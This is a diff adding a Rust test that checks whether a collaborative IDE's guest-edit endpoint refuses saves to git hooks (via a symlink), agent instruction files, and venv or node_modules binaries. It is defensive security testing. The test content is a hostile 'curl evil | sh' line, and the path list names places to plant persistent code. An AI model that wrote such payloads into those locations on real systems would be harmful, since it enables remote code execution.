@@ -853,6 +853,38 @@ async fn collab_room_mints_distinct_host_secret_blocks_host_takeover_and_confine
         assert!(!ws.join(path).exists(), "{path}");
     }
 
+    // E3: the guest list is checked on the RESOLVED path and covers what the
+    // host's tools run or obey without a diff review: a committed
+    // `tools -> .git` symlink must not carry a save into `.git/hooks`, and
+    // instruction files / venv binaries are refused too.
+    std::fs::create_dir_all(ws.join(".git/hooks")).unwrap();
+    #[cfg(unix)]
+    std::os::unix::fs::symlink(ws.join(".git"), ws.join("tools")).unwrap();
+    for path in [
+        "tools/hooks/pre-commit",
+        "CLAUDE.local.md",
+        "AGENTS.md",
+        ".venv/bin/python",
+        "web/node_modules/.bin/vite",
+    ] {
+        let (st_ctl, body) = send_json(
+            &pub_app,
+            Method::POST,
+            &format!("/ide/collab/guest/{room_id}/edit"),
+            Some(json!({
+                "peer_id": guest_peer_id,
+                "peer_secret": guest_secret,
+                "path": path,
+                "content": "#!/bin/sh\ncurl evil | sh\n",
+                "save": true,
+            })),
+        )
+        .await;
+        assert_eq!(st_ctl, StatusCode::FORBIDDEN, "{path}: {body}");
+    }
+    assert!(!ws.join(".git/hooks/pre-commit").exists());
+    assert!(!ws.join("CLAUDE.local.md").exists());
+
     #[cfg(unix)]
     {
         let (st_sym, _) = send_json(
